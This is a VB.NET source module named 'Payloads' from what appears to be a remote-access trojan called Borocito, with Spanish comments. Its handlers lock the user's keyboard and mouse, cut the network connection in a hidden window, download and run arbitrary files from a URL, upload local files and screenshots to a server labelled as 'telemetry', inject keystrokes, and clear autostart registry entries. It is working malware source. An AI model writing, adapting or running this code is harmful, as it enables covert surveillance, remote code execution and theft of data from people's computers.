Imports System.IO
Imports System.Runtime.Serialization.Formatters.Binary
Module Payloads
    Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
    Sub Inputs(ByVal Status As Boolean)
        On Error Resume Next
        BlockInput(Status)
        AddToLog("Payloads", "Input locker (Mouse & Keyboard) (" & Status & ")", False)
    End Sub
    Sub DesconectarConexion()
        On Error Resume Next
        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
        Dim ArgumentContent As String = "ipconfig /release"
        p.Arguments = ArgumentContent
        p.CreateNoWindow = True
        p.ErrorDialog = False
        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
        System.Diagnostics.Process.Start(p)
        AddToLog("Payloads", "Internet down!", False)
    End Sub
    Sub SendTheKeys(ByVal proccess As String, ByVal content As String)
        Dim ProcID As Integer
        ProcID = Shell(proccess, AppWinStyle.NormalFocus)
        AppActivate(ProcID)
        For Each singleChar As Char In content
            My.Computer.Keyboard.SendKeys(singleChar, True)
        Next
        AddToLog("Payloads", "A text content was processed and showed", False)
    End Sub
    Sub DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) 'WORKS! Last Check 03/05/2021 11:33PM
        'Uso CMD: /Payloads.DownloadComponent=URL,fileName,True,NULL,null
        'Descripcion
        '   URL = url de descarga directa
        '   fileName = nombre del archivo con su extencion
        '   True/False = si debe ser ejecutado
        '   args = indica argumentos para el inicio (solo en caso de RunIt=True)
        '   (opcional) filePath = indica una ruta para almacenar el archivo
        Try
            If filePath = Nothing Or filePath.ToLower = "null" Then
                filePath = DIRCommons & "\Comps"
            End If
            If Args = Nothing Or Args.ToLower = "null" Then
                Args = Nothing
            End If
            Try
                If My.Computer.FileSystem.DirectoryExists(filePath) = False Then
                    My.Computer.FileSystem.CreateDirectory(filePath)
                End If
            Catch
            End Try
            My.Computer.Network.DownloadFile(URL, filePath & "\" & fileName)
            Threading.Thread.Sleep(50)
            If RunIt = True Then
                Process.Start(filePath & "\" & fileName, Args)
            End If
        Catch
        End Try
    End Sub
    Sub uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing)
        'Uso CMD: /Payloads.uploadAfile=localFilePath,{serverUploadPost/null}
        Try
            If serverUpload = Nothing Or serverUpload.ToLower = "null" Then
                SendCustomTelemetryFile(filePath)
            Else
                SendCustomTelemetryFile(filePath, serverUpload)
            End If
        Catch ex As Exception
            AddToLog("uploadAfile@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub TakeAnScreenshot()
        Dim BF As New BinaryFormatter
        Dim IMAGEN As Bitmap
        Try
            Dim BM As Bitmap
            BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Dim DIBUJO As Graphics
            DIBUJO = Graphics.FromImage(BM)
            DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
            DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
            IMAGEN = New Bitmap(BM)
            Dim DIBUJO2 As Graphics
            DIBUJO2 = Graphics.FromImage(IMAGEN)
            Dim MICURSOR As Cursor = Cursors.Hand
            Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
            MICURSOR.Draw(DIBUJO2, RECTANGULO)
            Dim MS As New MemoryStream
            IMAGEN.Save(MS, Imaging.ImageFormat.Jpeg)
            IMAGEN = Image.FromStream(MS)
            Dim theFileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Screenshot.jpg"
            IMAGEN.Save(DIRCommons & "\" & theFileName, Imaging.ImageFormat.Jpeg)
            Threading.Thread.Sleep(100)
            Network.SendCustomTelemetryFile(DIRCommons & "\" & theFileName)
        Catch ex As Exception
            AddToLog("TakeAnScreenshot@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub

    Sub Restart()
        Try
            AddToLog("Restart@Payloads", "Restarting....", True)
            Process.Start(DIRCommons & "\Borocito.exe")
            End
        Catch ex As Exception
            AddToLog("Restart@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub Uninstall()
        Try
            AddToLog("Uninstall@Payloads", "Uninstalling, goodbye!....", True)
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Uninstall.cmd") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Uninstall.cmd")
            End If
            Dim Reg_BorocitoConfig As String = "reg delete " & """" & "HKEY_CURRENT_USER\SOFTWARE\Borocito" & """" & " /f" 'Borocito configuration
            Dim Reg_StartAsAdmin As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" & """" & " /v " & """" & Application.ExecutablePath & """" & " /f"
            Dim Reg_StartWithWindows As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" & """" & " /v " & """" & "Borocito" & """" & " /f"
            Dim File_UpdaterTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroUpdater.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroUpdater.exe" & """"
            Dim File_ExtractorTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroExtractor.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroExtractor.exe" & """"
            Dim Dir_DIRCommons As String = "rmdir /q /s " & """" & DIRCommons & """"
            Dim FinalContent As String = "@echo off /c " & Reg_BorocitoConfig &
                " & " & Reg_StartAsAdmin &
                " & " & Reg_StartWithWindows &
                " & " & File_UpdaterTemp &
                " & " & File_ExtractorTemp &
                " & " & Dir_DIRCommons
            Process.Start("cmd.exe", FinalContent)
            End
        Catch ex As Exception
            AddToLog("Uninstall@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub Update(Optional ByVal args As String = Nothing)
        Try
            AddToLog("Update@Payloads", "Starting Updater.exe...", True)
            Process.Start(DIRCommons & "\BorocitoUpdater.exe", args)
            End
        Catch ex As Exception
            AddToLog("Update@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub Extractor()
        Try
            AddToLog("Extractor@Payloads", "Starting Extractor.exe...", True)
            Process.Start(DIRCommons & "\BorocitoExtractor.exe")
            End
        Catch ex As Exception
            AddToLog("Extractor@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
End Module